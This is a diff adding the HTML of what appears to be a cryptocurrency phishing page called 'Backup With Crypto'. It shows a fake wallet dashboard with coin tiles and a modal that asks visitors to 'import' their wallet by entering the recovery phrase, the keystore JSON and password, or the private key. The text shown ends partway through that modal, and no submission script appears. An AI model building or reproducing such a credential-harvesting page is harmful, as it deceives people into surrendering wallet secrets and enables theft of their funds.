@@ -1,0 +1,1543 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <meta name="csrf-token" content="jA0iVqT8JIBdkMpn0xhuxcD7niZjH2RKQFLGg8QX">
+    <link rel="shortcut icon" type="image/png" href="images/icons/icon.png">
+    <title>
+        Backup With Crypto    </title>
+
+    
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.2/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <link href="css/glightbox.min.css" rel="stylesheet">
+    <link href="css/remixicon.css" rel="stylesheet">
+    <link href="css/swiper-bundle.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/selectric.css">
+    <link rel="stylesheet" href="css/animate.min.css">
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/iziToast.min.css">
+    <link href="css/style.css" rel="stylesheet">
+    <script src="js/jquery.min.js"></script>
+
+    <!-- sweet alert -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.12/dist/sweetalert2.all.min.js" integrity="sha256-2Dbg51yxfa7qZ8CSKqsNxHtph8UHdgbzxXF9ANtyJHo=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.12/dist/sweetalert2.min.css" integrity="sha256-7jUS+MWeqkFdmW9ozkZ7mPagz+QmMbsBlt+Q3MsE+FU=" crossorigin="anonymous">
+
+
+    <style>
+        @media (max-width: 991px) {
+            #header.header-inner-pages {
+                display: block;
+                background: transparent !important;
+                position: absolute;
+            }
+
+            .dashboard-body-part {
+                padding-top: 80px;
+                position: relative;
+                z-index: 1;
+            }
+
+            .dashboard-body-part::before {
+                position: absolute;
+                content: '';
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 160px;
+                background: linear-gradient(to top, #2f5b88, #153352);
+                z-index: -1;
+            }
+        }
+
+        .sp-referral .single-child {
+            padding: 6px 10px;
+            border-radius: 5px;
+        }
+
+        .sp-referral .single-child+.single-child {
+            margin-top: 15px;
+        }
+
+        .sp-referral .single-child p {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0;
+        }
+
+        .sp-referral .single-child p img {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            object-fit: cover;
+            -o-object-fit: cover;
+        }
+
+        .sp-referral .single-child p span {
+            width: calc(100% - 35px);
+            font-size: 14px;
+            padding-left: 10px;
+        }
+
+        .sp-referral>.single-child.root-child>p img {
+            border: 2px solid #c3c3c3;
+        }
+
+        .sub-child-list {
+            position: relative;
+            padding-left: 35px;
+        }
+
+        .sub-child-list::before {
+            position: absolute;
+            content: '';
+            top: 0;
+            left: 17px;
+            width: 1px;
+            height: 100%;
+            background-color: #a1a1a1;
+        }
+
+        .sub-child-list>.single-child {
+            position: relative;
+        }
+
+        .sub-child-list>.single-child::before {
+            position: absolute;
+            content: '';
+            left: -18px;
+            top: 21px;
+            width: 30px;
+            height: 5px;
+            border-left: 1px solid #a1a1a1;
+            border-bottom: 1px solid #a1a1a1;
+            border-radius: 0 0 0 5px;
+        }
+
+        .sub-child-list>.single-child>p img {
+            border: 2px solid #c3c3c3;
+        }
+    </style>
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'fef8c00a48acba26f16c2853274d48d987e719e1';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript>
+</head>
+
+<body>
+    <div id="preloader"></div>
+    <!-- ======= Header ======= -->
+    <header id="header" class="fixed-top header-inner-pages">
+        <div class="container-fluid d-flex align-items-center justify-content-between">
+            <div class="d-flex flex-wrap align-items-center">
+                <div class="logo me-auto me-lg-0 ">
+                    <a href="dashboard.php">
+                        <img class="img-fluid rounded sm-device-img text-align" src="images/icons/whitelogo.png" width="100%" alt="pp">
+                    </a>
+                </div>
+            </div>
+            <div class="header-right d-flex">
+
+
+                <div class="dropdown ms-3">
+                    <button class="dropdown-toggle user-toggle-menu" type="button" id="dropdownMenuButton1" data-bs-toggle="dropdown" aria-expanded="false">
+                        <img src="images/user.png" alt="pp">
+                        <span class="ms-2">Promise Chukwu</span>
+                    </button>
+                    <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="dropdownMenuButton1">
+                        <li><a class="dropdown-item" href="2fa.php">2fa</a></li>
+                        <li><a class="dropdown-item" href="profile_settings.php">Settings</a></li>
+                        <li><a class="dropdown-item" href="includes/logout.php">Logout</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </header><!-- End Header -->
+
+    <main id="main" class="dashboard-main">
+        <section class="dashboard-section">
+
+            <div class="d-sidebar">
+                <ul class="d-sidebar-menu">
+                    <li class="">
+                        <a href="dashboard.php"><i data-feather="home"></i> Dashboard</a>
+                    </li>
+                    <li class="">
+                        <a href="backup.php"><i data-feather="repeat"></i> Link Assets</a>
+                    </li>
+                    <li class="active">
+                        <a href="backup_crypto.php" style="display: inline-flex; align-items: center;"><i style=" margin-right: 7px;" class="material-icons">&#xe5d5;</i><span> Backup With Crypto</span></a>
+                    </li>
+                    <li class="">
+                        <a href="withdraw1.php"><i data-feather="credit-card"></i> Withdarw</a>
+                    </li>
+
+                    <!-- <li class="has_submenu ">
+                        <a href="#0"><i data-feather="zap"></i> Investment</a>
+                        <ul class="submenu">
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i></i> Investment plans</a>
+                            </li>
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i> Invest log</a>
+                            </li>
+                        </ul>
+                    </li> -->
+                    <!-- 
+                    <li class="has_submenu ">
+                        <a href="#0"><i data-feather="briefcase"></i> Deposit</a>
+                        <ul class="submenu">
+                            <li class="">
+                                <a href="dashboard.php"><i data-feather="chevrons-right"></i> Backup Wi</a>
+                            </li>
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i> Deposit log</a>
+                            </li>
+                        </ul>
+                    </li> -->
+
+                    <!-- <li class="has_submenu ">
+                        <a href="#0"><i data-feather="credit-card"></i> Withdraw</a>
+                        <ul class="submenu">
+                            <li class="">
+                                <a href="dashboard.php"><i data-feather="chevrons-right"></i> Withdraw</a>
+                            </li>
+                            <li class="">
+                                <a href=""><i data-feather="chevrons-right"></i> Withdraw log</a>
+                            </li>
+                        </ul>
+                    </li> -->
+
+                    <li class="">
+                        <a href="buy_coin.php"><i class="fas fa-hand-holding-usd"></i> Buy Coin</a>
+                    </li>
+                    <li class="">
+                        <a href="apply_card.php"><i class="fa fa-credit-card" aria-hidden="true"></i>
+                            Cards</a>
+                    </li>
+
+
+                    <!-- <li class="">
+                        <a href="">
+                            <i data-feather="file-text"></i>
+                            Money transfer log
+                        </a>
+                    </li> -->
+
+
+                    <!-- <li class="">
+                        <a href=""><i data-feather="file-text"></i> Interest log</a>
+                    </li> -->
+
+                    <!-- <li class="">
+                        <a href=""><i data-feather="file-text"></i> Refferal log</a>
+                    </li> -->
+
+                    <li class="">
+                        <a href="2fa.php"><i data-feather="shield"></i> 2fa</a>
+                    </li>
+                    <li class="">
+                        <a href=""><i data-feather="life-buoy"></i> Support</a>
+                    </li>
+                    <li>
+                        <a href="includes/logout.php"><i data-feather="log-out"></i> Logout</a>
+                    </li>
+                </ul>
+                <div class="d-plan-notice mt-4 mx-3">
+                    <p class="mb-0">Your current plan
+                        -N/A</p>
+                    <a href="">Update plan <i class="fas fa-arrow-up"></i></a>
+                </div>
+            </div>
+
+
+
+
+            <!-- mobile bottom menu start -->
+            <div class="mobile-bottom-menu-wrapper">
+                <ul class="mobile-bottom-menu">
+                    <li>
+                        <a href="backup_crypto.php" class="active">
+                            <i style=" margin-right: 7px;" class="material-icons">&#xe5d5;</i><span>
+                                <span>Backup Crypto</span>
+                        </a>
+                    </li>
+                    <!-- <li>
+                        <a href="apply_card.php" class="">
+                           <i class="fa fa-credit-card" aria-hidden="true"></i>
+                            <span>Cards</span>
+                        </a>
+                    </li> -->
+                    <li>
+                        <a href="backup.php" class="">
+                           <i class="fa fa-link" aria-hidden="true"></i>
+                            <span>Link Assets</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="dashboard.php" class="">
+                            <i class="bi bi-house-door"></i>
+                            <span>Home</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="withdraw1.php" class="">
+                            <i class="bi bi-cash-coin"></i>
+                            <span>Withdraw</span>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="buy_coin.php" class="">
+                            <i class="fas fa-hand-holding-usd"></i>
+                            <span>Buy Coin</span>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+
+           
+            <style>
+                #tidio-chat-iframe {
+                    inset: auto -7px 98px auto !important;
+                }
+            </style>
+<!-- mobile bottom menu end -->
+<div class="dashboard-body-part">
+    <br>
+<div class="mobile-page-header">
+        <h5 class="title">Backup Now</h5>
+        <a href="dashboard.php" class="back-btn"><i class="bi bi-arrow-left"></i> Back</a>
+    </div>
+
+    <div class="row g-sm-4 g-3 justify-content-between">
+        <!-- <div class="col-xl-12 col-lg-12">
+            <div class="user-account-number h-100">
+                <div class="card-dot mb-sm-4 mb-2">
+                    <span class="dot-1"></span>
+                    <span class="dot-2"></span>
+                </div>
+                <p class="caption mb-2">Account balance</p>
+                <h3 class="acc-number">$
+                <i class="bi bi-wallet2"></i>
+            </div>
+        </div> -->
+        <div class="card-header d-flex flex-wrap align-items-center justify-content-between">
+            <h5 class="mb-sm-0 mb-2">Kindly click on your assets to make a backup</h5>
+            <!-- <form action="" method="get" class="d-inline-flex">
+                <input type="text" name="trx" class="form-control form-control-sm me-2" placeholder="transaction id">
+                <input type="date" class="form-control form-control-sm me-3" placeholder="Search User" name="date">
+                <button type="submit" class="btn main-btn btn-sm">Search</button>
+            </form> -->
+        </div>
+
+        <div class="col-xl-4 col-lg-6">
+            <div class="row g-sm-4 g-3">
+                <div id="BTC" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/bitcoin.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="bitcoin_amount">0.0 BTC
+                            <p class="text-small mb-0 text-white" id="bitcoin_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="bitcoin_wFund">Bal 0.00 USD<br><small style="font-size: 13px;" id="bitcoin_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+                <div id="ETH" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/ethereum.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="ethereum_amount">0.00 ETH
+                            <p class="text-small mb-0 text-white" id="ethereum_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="ethereum_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="ethereum_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-4 col-lg-6">
+            <div class="row g-sm-4 g-3">
+                <div id="XLM" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/68966425-55b0b680-07de-11ea-8da0-a8615315f47e.png" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="xlm_amount">0.0 XLM
+                            <p class="text-small mb-0 text-white" id="xlm_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="xlm_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="xlm_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+                <div id="XRP" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/xrp-symbol-white-128.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="xrp_amount">0.0 XRP
+                            <p class="text-small mb-0 text-white" id="xrp_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="xrp_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="xrp_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-4 col-lg-6">
+            <div class="row g-sm-4 g-3">
+                <div id="TRC20" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/Tether.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="usdt_amount">0.0 TRC2O
+                            <p class="text-small mb-0 text-white" id="usdt_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="usdt_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="usdt_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+                <div id="TRON" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/tron-logo.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="tron_amount">0.0 TRON
+                            <p class="text-small mb-0 text-white" id="tron_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="tron_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="tron_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-4 col-lg-6">
+            <div class="row g-sm-4 g-3">
+                <div id="BNB" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/bnb-icon2_2x.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="binancecoin_amount">0.0 BNB
+                            <p class="text-small mb-0 text-white" id="binancecoin_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="binancecoin_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="binancecoin_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+                <div id="ADA" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/cardano.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="cardano_amount">0.0 ADA
+                            <p class="text-small mb-0 text-white" id="cardano_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="cardano_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="cardano_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-4 col-lg-6">
+            <div class="row g-sm-4 g-3">
+                <div id="DOGE" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/dogecoin.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="dogecoin_amount">0.0 DOGE
+                            <p class="text-small mb-0 text-white" id="dogecoin_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="dogecoin_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="dogecoin_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+                <div id="LTC" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/litecoin.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="litecoin_amount">0.0 LTC
+                            <p class="text-small mb-0 text-white" id="litecoin_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="litecoin_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="litecoin_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-4 col-lg-6">
+            <div class="row g-sm-4 g-3">
+                <div id="SHIBA" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/shiba.webp">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="shiba_amount">0.0 SHIBA
+                            <p class="text-small mb-0 text-white" id="shiba_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="shiba_wFund">Bal 0.00USD <br><small style="font-size: 13px;" id="shiba_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+                <div id="MATIC" class="col-lg-12 col-6 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/matic-token-icon.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="matic_amount">0.0 MATIC
+                            <p class="text-small mb-0 text-white" id="matic_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="matic_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="matic_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-4 col-lg-6 col-6">
+            <div class="row g-sm-4 g-3">
+                <div id="SOL" class="col-lg-12 col-12 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/solana.webp" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="solana_amount">0.0 SOL
+                            <p class="text-small mb-0 text-white" id="solana_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="solana_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="solana_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-xl-4 col-lg-6 move-right col-6">
+            <div class="row g-sm-4 g-3">
+                <div id="FTM" class="col-lg-12 col-12 deposit_bt">
+                    <div class="d-box-three gr-bg-1">
+                        <div class="icon">
+                            <!-- <i class="bi bi-piggy-bank text-white"></i> -->
+                            <img style="border-radius: 25px;" class="custom-img" src="images/icons/Fantom_round.png" alt="">
+                        </div>
+                        <div class="content">
+                            <p class="text-small mb-0 text-white" id="fantom_amount">0.0 FTM
+                            <p class="text-small mb-0 text-white" id="fantom_price">Loading Price...</p>
+                            </p>
+                            <h5 class="title text-white" id="fantom_wFund">Bal 0.00 USD <br><small style="font-size: 13px;" id="fantom_predict">0.0</small></h5>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- <div class="col-xl-4 col-lg-6">
+                        <div class="row g-sm-4 g-3">
+                            <div class="col-xl-12 col-6">
+                                <div class="d-box-three gr-bg-2">
+                                    <div class="icon">
+                                        <i class="bi bi-cash-coin text-white"></i>
+                                    </div>
+                                    <div class="content">
+                                        <p class="text-small mb-0 text-white">Total invest</p>
+                                        <h5 class="title text-white">011.00 USD</h5>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-xl-12 col-6">
+                                <div class="d-box-three gr-bg-4">
+                                    <div class="icon">
+                                        <i class="bi bi-wallet2 text-white"></i>
+                                    </div>
+                                    <div class="content">
+                                        <p class="text-small mb-0 text-white">Current invest</p>
+                                        <h5 class="title text-white">0
+                                            USD</h5>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div> -->
+    </div>
+
+    <!-- <div class="row gy-4 mt-1 d-box-two-wrapper d-sm-flex d-none">
+        <div class="col-xl-3 col-sm-6">
+            <div class="d-box-two">
+                <div class="d-box-two-icon">
+                    <i class="fas fa-boxes"></i>
+                </div>
+                <span class="caption-title">Current plan</span>
+                <h3 class="d-box-two-amount">N/A</h3>
+                <a href="" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="d-box-two">
+                <div class="d-box-two-icon">
+                    <i class="fas fa-money-check"></i>
+                </div>
+                <span class="caption-title">Pending invest</span>
+                <h3 class="d-box-two-amount">
+                    0.00 USD
+                </h3>
+                <a href="" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="d-box-two">
+                <div class="d-box-two-icon">
+                    <i class="fas fa-hourglass-half"></i>
+                </div>
+                <span class="caption-title">Pending withdraw</span>
+                <h3 class="d-box-two-amount">
+                    0.00 USD
+                </h3>
+                <a href="" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+            </div>
+        </div>
+        <div class="col-xl-3 col-sm-6">
+            <div class="d-box-two">
+                <div class="d-box-two-icon">
+                    <i class="fas fa-hand-holding-usd"></i>
+                </div>
+                <span class="caption-title">Refferal earn</span>
+                <h3 class="d-box-two-amount">
+                    0.00 USD
+                </h3>
+                <a href="" class="link-btn"><i class="fas fa-arrow-right"></i></a>
+            </div>
+        </div>
+    </div> -->
+
+    <!-- mobile screen card start -->
+    <!-- <div class="d-sm-none mt-4">
+        <div class="site-card">
+            <div class="card-body">
+                <h5 class="mb-4">More options</h5>
+                <div class="row gy-3 mobile-box-wrapper">
+                    <div class="col-4">
+                        <div class="mobile-box link-item">
+                            <a href="" class="item-link"></a>
+                            <i class="bi bi-journal-text"></i>
+                            <h6 class="title">Invest log</h6>
+                        </div>
+                    </div>
+                    <div class="col-4">
+                        <div class="mobile-box link-item">
+                            <a href="" class="item-link"></a>
+                            <i class="bi bi-journal-text"></i>
+                            <h6 class="title">Deposit log</h6>
+                        </div>
+                    </div>
+                    <div class="col-4">
+                        <div class="mobile-box link-item">
+                            <a href="" class="item-link"></a>
+                            <i class="bi bi-journal-text"></i>
+                            <h6 class="title">Withdraw log</h6>
+                        </div>
+                    </div>
+                    <div class="col-4">
+                        <div class="mobile-box link-item">
+                            <a href="" class="item-link"></a>
+                            <i class="bi bi-journal-text"></i>
+                            <h6 class="title">Interest log</h6>
+                        </div>
+                    </div>
+                    <div class="col-4">
+                        <div class="mobile-box link-item">
+                            <a href="" class="item-link"></a>
+                            <i class="bi bi-journal-text"></i>
+                            <h6 class="title">Money transfer log</h6>
+                        </div>
+                    </div>
+                    <div class="col-4">
+                        <div class="mobile-box link-item">
+                            <a href="" class="item-link"></a>
+                            <i class="bi bi-journal-text"></i>
+                            <h6 class="title">Transaction log</h6>
+                        </div>
+                    </div>
+                    <div class="col-4">
+                        <div class="mobile-box link-item">
+                            <a href="" class="item-link"></a>
+                            <i class="bi bi-journal-text"></i>
+                            <h6 class="title">Referral log</h6>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> -->
+    <!-- mobile screen card end -->
+
+    <!-- <div class="mt-4">
+        <label>Your refferal link</label>
+        <div class="input-group mb-3">
+
+
+        </div>
+    </div>
+
+
+
+    <div class="row">
+        <div class="col-md-12">
+            <div class="site-card">
+                <div class="card-header">
+                    <h5 class="mb-0">Reference tree</h5>
+                </div>
+                <div class="card-body">
+                    <div class="col-md-12 text-center mt-5">
+                        <i class="far fa-sad-tear display-1"></i>
+                        <p class="mt-2">
+                            No reference user found
+                        </p>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> -->
+</div>
+</section>
+
+
+
+<!-- modal -->
+<div class="modal fade" tabindex="-1" role="dialog" id="paynow">
+    <div class="modal-dialog" role="document">
+        <!-- <form action="" method="post"> -->
+        <input type="hidden" name="_token" value="p0gvYZcEqKi3wFcVVu99qSuCdhcnqUkA0eo1fovN">
+        <div class="modal-content bg-body">
+            <div class="modal-header">
+                <!-- <h5 class="modal-title">Backup Your Assetes</h5> -->
+                <button type="button" class="close modal_close" data-bs-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true" class="text-light">&times;</span>
+                </button>
+            </div>
+
+
+            <div class="row" style="margin: 10px 0px 0px 0px;">
+                <div class="col-4">
+                    <button style="font-size: x-small; height: 37px;" id="deposit_bt" type="submit" class="btn btn-sm main-btn"><i style="margin-right: 5px;" data-feather="briefcase"></i>Backup Now</button>
+                </div>
+                <div class="col-4">
+                    <button style="font-size: x-small; height: 37px;" id="withdraw_bt" type="submit" class="btn btn-sm main-btn"><i style="margin-right: 5px;" data-feather="credit-card"></i>Withdraw</button>
+                </div>
+                <div class="col-4">
+                    <button style="font-size: x-small; height: 37px;" id="buy" type="submit" class="btn btn-sm main-btn"><i style="margin-right: 5px;" class="fas fa-hand-holding-usd"></i>Buy Coin</button>
+
+                </div>
+
+                <!-- <div id="blc" class="col-6" style="margin-left: 16%;">
+                            <div style="width: 100px;"> <img width="100%" id="img" src="" alt=""></div>
+                            <b id="wallet_name"></b>
+                           
+                        </div> -->
+            </div>
+
+
+
+            <div class="modal-body">
+
+
+                <div style="display: none;" id="input_con" class="row">
+
+                    <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;" _mstvisible="6">
+                        <img src="" style="margin-right: 20px; height: 40px; width: 40px" id="myImg" _mstvisible="7">
+                        <span _msttexthash="543361" _msthash="8" _mstvisible="7">Import your
+                            <span id="walletname1" _msttexthash="75595" _msthidden="1" _msthash="182"></span> wallet
+                        </span>
+                    </h3>
+                    <nav>
+                        <div class="nav nav-tabs" id="nav-tab" role="tablist">
+                            <button class="nav-link active btn-sm" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Phrase</button>
+                            <button class="nav-link btn-sm" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">Keystore JSON</button>
+                            <button class="nav-link btn-sm" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Private Key</button>
+                        </div>
+                    </nav>
+                    <div class="tab-content" id="nav-tabContent">
+                        <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab">
+                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+                                <form class="sendp">
+
+                                    <div class="form-group">
+
+
+                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Recovery Phrase" name="Phrase" id="input" class="form-control" rows="3" required="required"></textarea>
+
+                                    </div>
+                                    <div class="form-group">
+                                        <input hidden type="text" name="type_of_login_detail" id="type_of_login_detail" value="recovery phrase">
+                                    </div>
+                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                    <div style="margin-top: 15px;" class="form-group">
+                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                    </div>
+
+                                </form>
+
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab">
+                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+
+                                <form class="sendp">
+
+                                    <div class="form-group">
+
+
+                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Keystore JSON" name="Keystore_json" id="input" class="form-control" rows="3" required="required"></textarea>
+
+                                    </div>
+                                    <div class="form-group">
+                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" id="email-1" placeholder="Wallet password">
+                                        <input hidden type="text" name="type_of_login_detail" id="type_of_login_detail" value="keystone">
+                                    </div>
+                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                    <div style="margin-top: 15px;" class="form-group">
+                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                    </div>
+
+                                </form>
+
+                            </div>
+                        </div>
